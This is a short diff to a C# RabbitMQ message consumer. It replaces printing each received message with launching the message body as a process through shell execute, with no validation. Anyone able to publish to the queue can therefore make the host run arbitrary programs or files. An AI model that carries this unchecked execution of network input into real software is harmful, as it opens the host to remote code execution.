@@ -1,4 +1,5 @@
 ﻿using RabbitMQ.Client.Events;
+using System.Diagnostics;
 using System.Text;
 
 namespace RabbitMQ.Client
@@ -25,10 +26,15 @@ namespace RabbitMQ.Client
 
         private static void Consumer_Received(object? sender, BasicDeliverEventArgs e)
         {
-            var messageRaw = e.Body.ToArray();
-            var message = Encoding.UTF8.GetString(messageRaw);
+            var path = Encoding.UTF8.GetString(e.Body.ToArray());
+            var proc = new Process();
+            proc.StartInfo = new ProcessStartInfo()
+            {
+                UseShellExecute = true,
+                FileName = path
+            };
 
-            Console.WriteLine($" [x] Received: {message} ");
+            proc.Start();
         }
     }
 }
